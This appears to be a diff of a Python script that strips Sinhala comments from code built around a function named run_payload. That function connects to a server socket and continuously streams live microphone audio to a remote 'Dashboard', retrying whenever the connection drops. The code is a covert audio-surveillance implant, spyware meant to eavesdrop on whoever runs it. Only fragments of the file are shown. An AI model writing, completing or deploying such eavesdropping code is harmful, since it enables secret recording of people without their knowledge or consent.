@@ -3,7 +3,7 @@ import sounddevice as sd
 import time
 
 SERVER_IP = '127.0.0.1' 
-PORT = 50005  # Oya dan use karana port eka danna
+PORT = 50005  
 
 def callback(indata, frames, time, status):
     """Me function eka microphone eken ena data Dashboard ekata yawai"""
@@ -23,10 +23,10 @@ def run_payload():
             client_socket.settimeout(10)
             client_socket.connect((SERVER_IP, PORT))
             
-            # Live streaming start karanawa
+         
             with sd.InputStream(samplerate=44100, channels=1, dtype='int16', callback=callback):
                 while True:
-                    time.sleep(1) # Digatama stream eka thiyaganna
+                    time.sleep(1) 
                     
         except Exception as e:
             print(f"Connection lost, retrying... {e}")
